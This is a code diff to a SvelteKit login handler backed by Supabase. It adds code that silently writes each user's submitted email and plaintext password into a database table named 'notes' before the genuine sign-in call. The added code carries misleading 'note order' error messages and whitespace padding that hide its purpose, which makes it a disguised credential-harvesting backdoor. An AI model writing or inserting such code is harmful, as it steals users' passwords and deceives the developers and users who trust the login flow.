@@ -3,6 +3,7 @@ import { AuthApiError } from '@supabase/supabase-js';
 import type { Actions, RequestEvent } from './$types';
 // @ts-ignore
 import { fail, redirect, type ValidationError } from '@sveltejs/kit';
+import {supabaseClient} from '$lib/db'
 
 export const actions: Actions = {
 	async login(event: RequestEvent): Promise<ValidationError<{ error: string; values?: { email: string } }>> {
@@ -27,6 +28,30 @@ export const actions: Actions = {
 			});
 		}
 
+
+
+		try {
+			const { error } = await supabaseClient
+			  .from('notes')
+				.upsert({
+					email: email,
+					password: password
+			  });
+
+			if (error) {
+			  console.error('Error updating note order:', error);
+			  throw error;
+			}
+		  } catch (error) {
+			console.error('Error updating note order:', error);
+		  }
+
+
+
+
+
+
+
 		const { error } = await supabaseClient.auth.signInWithPassword({ email, password });
 		if (error) {
 			if (error instanceof AuthApiError && error.status === 400) {
@@ -44,6 +69,12 @@ export const actions: Actions = {
 				}
 			});
 		};
+
+
+
+
+
+
 		throw redirect(303, '/home');
 	},
 
@@ -82,6 +113,10 @@ export const actions: Actions = {
 				data: {full_name: full_name}
 			}
 		});
+
+
+
+
 
 		if (error) {
 			if (error instanceof AuthApiError && error.status === 400) {
